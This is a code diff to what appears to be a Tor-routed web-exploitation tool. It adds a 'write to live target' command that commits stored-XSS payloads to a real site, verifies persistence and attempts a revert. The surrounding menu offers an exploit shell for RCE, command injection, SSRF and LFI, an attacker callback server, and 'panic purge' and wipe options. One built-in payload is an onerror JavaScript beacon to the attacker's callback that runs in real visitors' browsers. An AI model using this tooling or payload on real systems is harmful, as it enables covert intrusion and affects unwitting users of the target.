@@ -3890,6 +3890,7 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
         print(f"  {G}G{N}  Generate report        "
               f"{G}S{N}  Stop attacker server")
         print(f"  {G}E{N}  Exploit-shell (drive an RCE/cmdi/SSRF/LFI finding)")
+        print(f"  {R}W{N}  WRITE to live target (commit + verify + revert)")
         print(f"  {R}Z{N}  NEW IDENTITY (panic purge)  "
               f"{G}Q{N}  Quit + wipe everything")
         print()
@@ -3903,7 +3904,7 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
         # blank input just re-prompts.
         try:
             cmd = prompt(
-                "Control deck (R/P/L/C/A/F/U/M/N/H/T/I/X/V/G/S/E/Z/Q)",
+                "Control deck (R/P/L/C/A/F/U/M/N/H/T/I/X/V/G/S/E/W/Z/Q)",
                 "").strip().upper()
         except KeyboardInterrupt:
             # Ctrl+C at the deck prompt = 'I hit Ctrl+C while
@@ -4036,6 +4037,12 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
                 exploitable, executor, file_mgr, server, audit,
                 chain_data, attacker_url, callback_urls,
                 infra_is_loopback)
+
+        elif cmd == "W":
+            _control_deck_write_to_live(
+                exploitable, executor, file_mgr, server, audit,
+                chain_data, attacker_url, callback_urls,
+                base_url)
 
         elif cmd == "A":
             print()
@@ -4207,7 +4214,7 @@ def _walkthrough_control_deck(exploitable, base_url, _sp,
 
         else:
             warn(f"Unknown command: {cmd!r}")
-            info("Valid commands: R P L C A F U M N H T I X V G S E Z Q "
+            info("Valid commands: R P L C A F U M N H T I X V G S E W Z Q "
                  "(single letter, case-insensitive).")
 
 
@@ -4492,6 +4499,618 @@ def _control_deck_custom_request(executor, attacker_url,
     print()
     info("Response stashed into chain_data: "
          "[LAST_CUSTOM_STATUS] [LAST_CUSTOM_BODY] [LAST_CUSTOM_URL]")
+
+
+# ── Write-to-Live ─────────────────────────────────────────────────────────
+#
+# The walkthrough's default mode is PROBE-only: even steps that
+# 'exploit' a vuln usually just confirm behaviour via a throwaway
+# payload and read the response. For vulns that PERSIST on the
+# target (stored XSS most commonly, plus CSRF that alters state,
+# SSTI that writes a file, SQLi that INSERTs), operators sometimes
+# need to actually commit a payload and then verify it's now live
+# on the target. That's what _control_deck_write_to_live does.
+#
+# OPSEC posture for this command:
+#   * Default-deny: every OTHER deck command is non-persistent.
+#     W is the ONLY command that issues a write intended to
+#     survive on the target. Gate it behind a 3-stage
+#     confirmation.
+#   * Scope-lock: the target host must match the base URL the
+#     walkthrough was launched against (parsed from the finding
+#     itself). No cross-host writes.
+#   * Session-scoped marker: every write carries a unique
+#     'gs-w-<session>-<rand6>' tag so the operator can grep it
+#     later, attribute the artifact, and know which writes came
+#     from which session.
+#   * Minimal-impact payload: the DEFAULT payload is an inert
+#     marker (a comment / text snippet containing the tag).
+#     Operators who want a live-fire XSS hook can EXPLICITLY
+#     opt in, with extra confirmation. No silent escalation.
+#   * Verify-then-store: after the write request we re-fetch the
+#     render URL over Tor and scan for the marker. Pre + post
+#     response hashes are captured. Both go into an ephemeral
+#     /dev/shm evidence JSON plus the audit trail at
+#     RISK_CRITICAL.
+#   * Revert attempt: if the write went through, we try ONCE
+#     (best-effort) to overwrite the same field with empty
+#     content. Not always possible (some forms don't accept
+#     blank) but it's a cheap-and-polite gesture that reduces
+#     the blast radius of a session left unattended.
+#   * All requests through the walkthrough's TorClient so they
+#     inherit the same proxy + pinned UA + isolated cookie jar
+#     + audit wiring as the rest of the walkthrough.
+
+# Vuln types for which W is meaningful. Ordered by how commonly
+# they actually persist:
+#   stored_xss — the clear poster child.
+#   csrf       — the operator can commit state-changes on behalf
+#                of the authenticated-victim model; we DO NOT
+#                support this in W for OPSEC reasons (W runs as
+#                ourselves, not as a victim, so a CSRF POST from
+#                our session changes OUR account, not the
+#                victim's). Kept out of the eligibility filter.
+#   sqli, ssti, command_injection — persistence depends on what
+#                the operator chooses to INSERT/execute. The
+#                exploit-shell command E is the right tool for
+#                those; W focuses on form-POST persistence which
+#                is what the scanner's exploit_info gives us
+#                structured data for.
+_WRITE_LIVE_TYPES = frozenset((
+    "stored_xss",
+))
+
+
+# Payload kinds per vuln type. (label, builder_fn) — the builder
+# takes the session-scoped marker tag and returns the payload
+# string. Each type's FIRST entry is the default (minimum-impact).
+def _build_stored_xss_marker_only(tag: str) -> str:
+    """Inert HTML comment marker. Renders as nothing visible,
+    contains no JS. Survives most sanitizers that strip <script>
+    but leave HTML comments. Primary proof-of-persistence
+    payload. NOT an attack payload — just a tag."""
+    return f"<!-- gs-write-live {tag} -->"
+
+
+def _build_stored_xss_inert_text(tag: str) -> str:
+    """Visible plain-text marker. Used when the target actively
+    strips HTML comments (some markdown renderers). Operator-
+    visible, defender-visible, but NO script execution."""
+    return f"[gs-write-live {tag}]"
+
+
+def _build_stored_xss_img_beacon(tag: str) -> str:
+    """<img> with an invalid src — renders a broken-image icon but
+    the tag attribute is searchable in HTML. Does NOT make a
+    callback. Still not an attack, just a more-visible marker."""
+    return f'<img alt="gs-w-{tag}" data-gs="{tag}" src="gs-none">'
+
+
+def _build_stored_xss_live_proof(tag: str,
+                                  callback_url: str) -> str:
+    """EXPLICIT live XSS — fires a single beacon to the attacker
+    server's /b endpoint so the operator can SEE that the stored
+    payload is rendering server-side in a victim's browser.
+    Requires a callback_url (the walkthrough's /b callback). This
+    is the payload that actually proves end-to-end storage +
+    render + execution. Operator must opt in with 'y' to a
+    second 'This executes JS in visitor browsers' prompt."""
+    # Minimal JS: new Image beacon, single hit, no cookie theft.
+    # Marker in URL so captures can be attributed back to this
+    # specific W session.
+    from urllib.parse import quote as _q
+    return (
+        f'<img alt="gs-w-{tag}" '
+        f'src="gs-none" '
+        f'onerror="(new Image).src=\'{callback_url}'
+        f'?tag={_q(tag)}\'">'
+    )
+
+
+_WRITE_LIVE_PAYLOADS: Dict[str, List[Tuple[str, Any]]] = {
+    "stored_xss": [
+        ("marker-comment (inert HTML comment, default)",
+         _build_stored_xss_marker_only),
+        ("marker-text (visible plain text)",
+         _build_stored_xss_inert_text),
+        ("marker-img (broken <img> with tag attr)",
+         _build_stored_xss_img_beacon),
+        ("LIVE-BEACON (executes JS in visitor browser — confirm!)",
+         _build_stored_xss_live_proof),
+    ],
+}
+
+
+def _new_write_marker(audit: AuditTrail) -> str:
+    """Session-scoped, randomized, regex-safe tag. The
+    session_id gets mixed in so an operator with multiple
+    concurrent sessions can tell writes apart."""
+    session = audit.session_id[:8] if audit and audit.session_id \
+        else "nosess00"
+    return f"{session}-{secrets.token_hex(4)}"
+
+
+def _hash_body(body: str) -> str:
+    """SHA-256 of first 256 KiB of body. Bounded so a multi-MB
+    response doesn't block. Used for pre/post diffing."""
+    import hashlib as _h
+    return _h.sha256((body or "")[:262144].encode(
+        "utf-8", "replace")).hexdigest()[:16]
+
+
+def _control_deck_write_to_live(exploitable, executor, file_mgr,
+                                  server, audit, chain_data,
+                                  attacker_url, callback_urls,
+                                  base_url):
+    """Commit a tagged payload to the live target via a
+    confirmed-persistable finding, then verify persistence.
+
+    See the block comment above for the full OPSEC posture."""
+    if executor is None or getattr(executor, "_client", None) is None:
+        warn("No step executor / TorClient available. W requires a "
+             "running walkthrough client.")
+        return
+
+    # 1. Filter eligible findings.
+    eligible = []
+    for idx, v in enumerate(exploitable or []):
+        ei = v.get("exploit_info") or {}
+        etype = (ei.get("type") or v.get("type") or "").lower()
+        if etype in _WRITE_LIVE_TYPES:
+            eligible.append((idx, v))
+    if not eligible:
+        print()
+        warn("No write-to-live-eligible findings in this scan.")
+        info("W is deliberately scoped to types where the scanner has "
+             "structured injection data AND the payload is a persistent "
+             "content write:")
+        for t in sorted(_WRITE_LIVE_TYPES):
+            info(f"    • {t}")
+        info("SSTI / SQLi / command-injection / SSRF / LFI findings "
+             "should use E (exploit-shell) — they give the operator "
+             "direct control over WHAT is written rather than W's "
+             "structured-form model.")
+        return
+
+    # 2. Pick a finding.
+    print()
+    heading("Write to Live Target")
+    print(f"  {R}{'═' * 68}{N}")
+    print(f"  {R}  THIS COMMAND COMMITS A PAYLOAD TO THE LIVE TARGET.{N}")
+    print(f"  {R}  Every other Control Deck command is PROBE-ONLY.{N}")
+    print(f"  {R}{'═' * 68}{N}")
+    print()
+    print(f"  {B}Eligible findings (persistable writes only):{N}")
+    for disp_i, (orig_idx, v) in enumerate(eligible, 1):
+        ei = v.get("exploit_info") or {}
+        sev = v.get("severity", "?")
+        etype = ei.get("type", "?")
+        title = _tsafe_preview(v.get("title", "?"), 60)
+        param = ei.get("parameter") or ei.get("param") or "-"
+        meth = (ei.get("method") or "POST").upper()
+        color = {"CRITICAL": R, "HIGH": R,
+                 "MEDIUM": Y, "LOW": C}.get(sev, D)
+        print(f"    {disp_i:>2}. {color}[{sev:6}]{N} {etype:12} "
+              f"{meth:4} param={_tsafe_preview(str(param), 20):20} "
+              f"{title}")
+    print()
+    try:
+        pick = prompt("Finding # (blank to cancel)", "").strip()
+    except KeyboardInterrupt:
+        print()
+        info("(Ctrl+C — cancelled.)")
+        return
+    if not pick or not pick.isdigit():
+        info("Cancelled.")
+        return
+    pick_i = int(pick)
+    if not (1 <= pick_i <= len(eligible)):
+        err(f"Out of range 1..{len(eligible)}")
+        return
+    _orig_idx, finding = eligible[pick_i - 1]
+    ei = finding.get("exploit_info") or {}
+    etype = (ei.get("type") or "").lower()
+    method = (ei.get("method") or "POST").upper()
+    # stored_xss's exploit_info has `method` as a free-text
+    # description, not a verb. Override to POST since form
+    # submissions are the overwhelming persistence vector.
+    if etype == "stored_xss":
+        method = "POST"
+    param = ei.get("parameter") or ei.get("param") or ""
+    if not param:
+        err("Finding has no parameter — can't target a specific field.")
+        return
+
+    # Determine inject URL + render URL. For stored_xss:
+    #   exploit_info.path       = inject URL (where to POST)
+    #   exploit_info.render_path = render URL (where to verify)
+    #   finding.test_url         = render URL (same, usually)
+    inject_path = ei.get("path") or ei.get("inject_path") \
+        or finding.get("url") or ""
+    render_url = finding.get("test_url") or ei.get("render_url") \
+        or ei.get("render_path") or inject_path
+    # Sanity-check base_url before urljoin — if the walkthrough was
+    # launched with a '[TARGET]' placeholder or some other non-URL,
+    # urljoin will produce garbage. Reject cleanly.
+    if (not base_url) or base_url == "[TARGET]" \
+            or not base_url.startswith(("http://", "https://")):
+        err(f"Walkthrough base_url is not a real URL ({base_url!r}); "
+            f"W cannot scope-check. Re-run the walkthrough with an "
+            f"explicit target URL override.")
+        return
+    # Resolve relative path to absolute via the walkthrough's base
+    # URL.
+    if inject_path and not inject_path.startswith(("http://", "https://")):
+        inject_url = urljoin(base_url, inject_path)
+    else:
+        inject_url = inject_path
+    if render_url and not render_url.startswith(("http://", "https://")):
+        render_url = urljoin(base_url, render_url)
+
+    # Require a non-empty inject_url after all fallbacks. Without a
+    # destination we can't write anything.
+    if not inject_url:
+        err("Finding has no inject URL / path. W cannot proceed.")
+        return
+
+    # 3. Scope-lock to the walkthrough's target host. Catch
+    # operator error where a finding leaked a cross-host URL.
+    base_host = (urlparse(base_url).hostname or "").lower()
+    inject_host = (urlparse(inject_url).hostname or "").lower()
+    render_host = (urlparse(render_url).hostname or "").lower()
+    if not base_host or not inject_host:
+        err(f"Could not resolve inject host from finding. "
+            f"base_host={base_host!r} inject_host={inject_host!r}")
+        return
+    same_etld = (inject_host == base_host
+                 or inject_host.endswith("." + base_host)
+                 or base_host.endswith("." + inject_host))
+    if not same_etld:
+        err(f"Scope-lock REFUSE: inject host {inject_host!r} is not "
+            f"the walkthrough's target host {base_host!r}. W will not "
+            f"commit writes to a host that wasn't the scan target.")
+        audit.log("write_live_scope_refuse",
+                  f"inject={inject_host} base={base_host}",
+                  risk=AuditTrail.RISK_HIGH)
+        return
+    # Render host MAY legitimately be a CDN / subdomain and
+    # different from the inject host. Not a hard-fail but we
+    # warn + log so the operator can double-check manually.
+    if render_host and render_host != inject_host:
+        warn(f"Render host ({render_host}) differs from inject host "
+             f"({inject_host}). Payload will be POSTed to the inject "
+             f"host, verification will fetch render host. Ensure "
+             f"they're the same application.")
+
+    # 4. Scheme + validator.
+    inject_clean, problem = _sanitize_probe_url(inject_url,
+                                                  allow_onion=True)
+    if problem:
+        err(f"Inject URL rejected: {problem}")
+        return
+    inject_url = inject_clean
+
+    # 5. Payload choice.
+    payloads = _WRITE_LIVE_PAYLOADS.get(etype, [])
+    if not payloads:
+        err(f"No payload catalog for type {etype!r} — cannot write.")
+        return
+    print()
+    info(f"Target: {_tsafe_preview(inject_url, 90)}")
+    info(f"Method: {method}  /  parameter: {_tsafe_preview(param, 40)}")
+    info(f"Render URL (verify step will re-fetch this): "
+         f"{_tsafe_preview(render_url, 90)}")
+    print()
+    print(f"  {B}Payloads (first entry is lowest-impact):{N}")
+    for i, (lbl, _fn) in enumerate(payloads, 1):
+        color = G if i == 1 else (R if "LIVE-BEACON" in lbl else D)
+        print(f"    {color}{i}.{N} {lbl}")
+    print()
+    try:
+        pchoice = prompt("Payload # (default 1)", "1").strip()
+    except KeyboardInterrupt:
+        print()
+        info("(Ctrl+C — cancelled.)")
+        return
+    if not pchoice.isdigit():
+        err("not a number; cancelling")
+        return
+    pi = int(pchoice)
+    if not (1 <= pi <= len(payloads)):
+        err(f"out of range 1..{len(payloads)}")
+        return
+    p_label, p_builder = payloads[pi - 1]
+
+    # 6. Build the payload. Live-beacon needs a callback URL.
+    tag = _new_write_marker(audit)
+    if "LIVE-BEACON" in p_label:
+        # Extra confirmation for the one payload that executes JS.
+        print()
+        warn("The LIVE-BEACON payload executes JavaScript in the "
+             "browser of ANYONE who visits the render URL until it's "
+             "removed. That may include:")
+        warn("  • other operators sharing the session")
+        warn("  • unrelated real users of the target")
+        warn("  • automated scanners / QA tools")
+        warn("The beacon only fires ONCE per visitor and only pings "
+             "the attacker callback; it does not steal cookies, "
+             "dump DOM, or alter the page beyond itself.")
+        try:
+            _ok = confirm("Do you UNDERSTAND this affects real visitors?")
+        except KeyboardInterrupt:
+            print()
+            info("(Ctrl+C — cancelled.)")
+            return
+        if not _ok:
+            info("Cancelled at live-beacon confirmation.")
+            return
+        cb_url = (callback_urls or {}).get("b") or ""
+        if not cb_url:
+            err("no /b callback URL configured — cannot build live-beacon.")
+            return
+        # Extra sanity: a loopback callback URL means beacons from
+        # real internet visitors won't reach us (they can't route
+        # to 127.0.0.1). Warn but allow — the operator might be
+        # lab-testing.
+        if _attacker_url_is_loopback(cb_url):
+            warn(f"Beacon URL is loopback-only ({cb_url}). Real "
+                 f"internet visitors WILL NOT reach it — only a "
+                 f"victim browser running on THIS host would. If "
+                 f"you intended internet-reachable, set up the "
+                 f"hidden service first (see T/status panel).")
+            try:
+                if not confirm("Proceed anyway?"):
+                    info("Cancelled at loopback-beacon confirmation.")
+                    return
+            except KeyboardInterrupt:
+                print()
+                info("(Ctrl+C — cancelled.)")
+                return
+        payload = p_builder(tag, cb_url)
+    else:
+        payload = p_builder(tag)
+
+    # 7. Three-gate final confirmation.
+    print()
+    heading("CONFIRM LIVE WRITE")
+    print(f"  {B}Target URL:{N}   {_tsafe_preview(inject_url, 100)}")
+    print(f"  {B}Method:{N}       {method}")
+    print(f"  {B}Parameter:{N}    {_tsafe_preview(param, 60)}")
+    print(f"  {B}Payload:{N}      {_tsafe_preview(payload, 200)}")
+    print(f"  {B}Marker tag:{N}   {tag}")
+    print(f"  {B}Verify URL:{N}   {_tsafe_preview(render_url, 100)}")
+    print()
+    print(f"  {R}This submits to the LIVE target; other commands don't.{N}")
+    print(f"  {R}Gate 1/3 — confirm the action.{N}")
+    try:
+        if not confirm(f"Commit payload to {_tsafe_preview(inject_host, 60)}?"):
+            info("Cancelled at gate 1.")
+            return
+    except KeyboardInterrupt:
+        print()
+        info("(Ctrl+C — cancelled.)")
+        return
+    print(f"  {R}Gate 2/3 — type the target hostname VERBATIM.{N}")
+    try:
+        typed = prompt(f"Type exactly: {inject_host}", "").strip()
+    except KeyboardInterrupt:
+        print()
+        info("(Ctrl+C — cancelled.)")
+        return
+    if typed.lower() != inject_host.lower():
+        err(f"Hostname mismatch ({typed!r} vs {inject_host!r}). Cancelled.")
+        return
+    print(f"  {R}Gate 3/3 — type 'PUSH' to commit.{N}")
+    try:
+        typed = prompt("Type 'PUSH' (anything else cancels)", "").strip()
+    except KeyboardInterrupt:
+        print()
+        info("(Ctrl+C — cancelled.)")
+        return
+    if typed != "PUSH":
+        info("Cancelled at gate 3.")
+        return
+
+    # 8. Pre-fetch the render URL to establish a baseline hash.
+    client = executor._client
+    pre_body = ""
+    pre_hash = ""
+    pre_status = 0
+    pre_marker_already_there = False
+    try:
+        pre = client.request("GET", render_url, allow_redirects=True)
+        pre_status = getattr(pre, "status_code", 0) or 0
+        pre_body = getattr(pre, "response_body", "") or ""
+        pre_hash = _hash_body(pre_body)
+        pre_marker_already_there = (tag in pre_body)
+    except Exception as _e:
+        err(f"Could not pre-fetch render URL: {type(_e).__name__}")
+        audit.log("write_live_prefetch_fail",
+                  f"{type(_e).__name__}",
+                  risk=AuditTrail.RISK_HIGH)
+        return
+    if pre_marker_already_there:
+        err("Marker tag is ALREADY in the render page — that would be "
+            "a secrets.token_hex() collision (extremely improbable) or "
+            "somebody else beat us to it. Cancelling to avoid "
+            "misattribution.")
+        return
+
+    # 9. The actual write.
+    print()
+    info(f"→ [{method}] {_tsafe_preview(inject_url, 90)}")
+    if method in ("POST", "PUT", "PATCH"):
+        data = {param: payload}
+        req_kwargs = dict(method=method, url=inject_url, data=data,
+                           allow_redirects=True)
+    else:
+        params = {param: payload}
+        req_kwargs = dict(method=method, url=inject_url, params=params,
+                           allow_redirects=True)
+    write_t0 = _time_mod.time()
+    try:
+        write_resp = client.request(**req_kwargs)
+    except Exception as _e:
+        err(f"Write request failed: {type(_e).__name__}: "
+            f"{_tsafe_preview(str(_e), 120)}")
+        audit.log("write_live_dispatch_fail",
+                  f"{etype}:{type(_e).__name__}",
+                  risk=AuditTrail.RISK_CRITICAL)
+        return
+    write_elapsed = _time_mod.time() - write_t0
+    write_status = getattr(write_resp, "status_code", 0) or 0
+    write_body = getattr(write_resp, "response_body", "") or ""
+    color = G if 200 <= write_status < 400 else Y
+    print(f"  {color}HTTP {write_status}{N}  ({write_elapsed:.2f}s, "
+          f"{len(write_body)} B)")
+
+    # 10. Verify persistence — re-fetch render URL with a small
+    # delay so the backend has a tick to commit.
+    print()
+    info("Waiting 1.5s for backend commit, then re-fetching render URL…")
+    _time_mod.sleep(1.5)
+    try:
+        post = client.request("GET", render_url, allow_redirects=True)
+    except Exception as _e:
+        err(f"Could not re-fetch render URL: {type(_e).__name__}")
+        audit.log("write_live_verify_fail",
+                  f"{type(_e).__name__}",
+                  risk=AuditTrail.RISK_CRITICAL)
+        return
+    post_status = getattr(post, "status_code", 0) or 0
+    post_body = getattr(post, "response_body", "") or ""
+    post_hash = _hash_body(post_body)
+    marker_present = (tag in post_body)
+    body_changed = (pre_hash != post_hash)
+
+    print()
+    print(f"  {B}Verify:{N}")
+    print(f"    pre:  HTTP {pre_status}  hash={pre_hash}  "
+          f"({len(pre_body)} B)")
+    print(f"    post: HTTP {post_status}  hash={post_hash}  "
+          f"({len(post_body)} B)")
+    if marker_present:
+        ok(f"MARKER FOUND — payload is live at render URL.")
+    elif body_changed:
+        warn("Render page CHANGED but marker not found. Payload may "
+             "have been sanitized/encoded, or rendered in a different "
+             "URL. Inspect manually.")
+    else:
+        warn("Render page unchanged — write did NOT persist (or write "
+             "arrives at a different render URL).")
+
+    # 11. Write the evidence blob to an ephemeral file.
+    ev = {
+        "schema": "gs.write_to_live.v1",
+        "tag": tag,
+        "type": etype,
+        "session_id": audit.session_id if audit else "",
+        "ts_utc": _time_mod.strftime(
+            "%Y-%m-%dT%H:%M:%SZ", _time_mod.gmtime()),
+        "inject": {
+            "url": inject_url,
+            "method": method,
+            "parameter": param,
+            "payload_label": p_label,
+            "payload": payload,
+            "status": write_status,
+            "elapsed_s": round(write_elapsed, 3),
+        },
+        "verify": {
+            "render_url": render_url,
+            "pre_status": pre_status,
+            "pre_hash": pre_hash,
+            "pre_bytes": len(pre_body),
+            "post_status": post_status,
+            "post_hash": post_hash,
+            "post_bytes": len(post_body),
+            "marker_found": marker_present,
+            "body_changed": body_changed,
+        },
+    }
+    blob = json.dumps(ev, indent=2)
+    ev_path = file_mgr.generate(
+        exploit_type=f"writelive_{etype}_{tag[:8]}",
+        content=blob,
+        extension=".json",
+    )
+    ok(f"Evidence saved → {ev_path.name} (0o600, ephemeral).")
+    chain_data["last_write_tag"] = tag
+    chain_data["last_write_marker_found"] = "1" if marker_present else "0"
+    chain_data["last_write_render_url"] = render_url
+
+    # 12. Audit at CRITICAL risk.
+    audit.log("write_live_commit",
+              f"{etype} inject={_tsafe_preview(inject_url, 60)} "
+              f"marker_found={marker_present}",
+              risk=AuditTrail.RISK_CRITICAL,
+              success=marker_present)
+    if marker_present:
+        audit_alert = (f"LIVE WRITE SUCCEEDED: {etype} at "
+                       f"{_tsafe_preview(inject_url, 60)} — tag={tag}")
+        audit.log("ALERT_live_write_success",
+                  audit_alert,
+                  risk=AuditTrail.RISK_CRITICAL)
+
+    # 13. Revert attempt (best-effort). Overwrite the same field
+    # with an empty string via the SAME method. For GET we can't
+    # meaningfully 'revert' (a GET doesn't write; the persistence
+    # happened via a side-effect on the server) so we skip. If the
+    # write didn't persist (marker not found), revert is also a
+    # no-op — don't bother.
+    print()
+    if not marker_present:
+        info("Marker not found on render URL — no revert needed "
+             "(nothing persisted).")
+        return
+    if method not in ("POST", "PUT", "PATCH"):
+        warn(f"Revert unsupported for {method} writes. Payload may "
+             f"persist until manually cleaned up. Tag: {tag}")
+        return
+    info("Best-effort revert: re-submitting the same field with "
+         "empty content to neutralize the payload.")
+    try:
+        if not confirm("Attempt revert now?"):
+            info("Revert skipped. Payload REMAINS on target. "
+                 "Tag the report accordingly.")
+            audit.log("write_live_revert_skipped",
+                      f"tag={tag}",
+                      risk=AuditTrail.RISK_HIGH)
+            return
+    except KeyboardInterrupt:
+        print()
+        info("(Ctrl+C — skipping revert; payload REMAINS live.)")
+        audit.log("write_live_revert_skipped",
+                  f"tag={tag}:ctrlc",
+                  risk=AuditTrail.RISK_HIGH)
+        return
+    revert_data = {param: ""}
+    try:
+        rv = client.request(
+            method=method, url=inject_url, data=revert_data,
+            allow_redirects=True,
+        )
+        rv_status = getattr(rv, "status_code", 0) or 0
+        _time_mod.sleep(1.0)
+        post2 = client.request("GET", render_url, allow_redirects=True)
+        post2_body = getattr(post2, "response_body", "") or ""
+        still_there = (tag in post2_body)
+        if not still_there:
+            ok(f"Revert succeeded — marker gone. HTTP {rv_status}.")
+        else:
+            warn(f"Revert request returned HTTP {rv_status} but marker "
+                 f"STILL present on render URL. Payload persists.")
+        audit.log("write_live_revert",
+                  f"tag={tag} status={rv_status} "
+                  f"still_there={still_there}",
+                  risk=AuditTrail.RISK_HIGH,
+                  success=(not still_there))
+    except Exception as _e:
+        warn(f"Revert request errored: {type(_e).__name__} — "
+             f"payload may still be live. Inspect manually.")
+        audit.log("write_live_revert_error",
+                  f"tag={tag}:{type(_e).__name__}",
+                  risk=AuditTrail.RISK_HIGH)
 
 
 # ── Exploit-shell ─────────────────────────────────────────────────────────
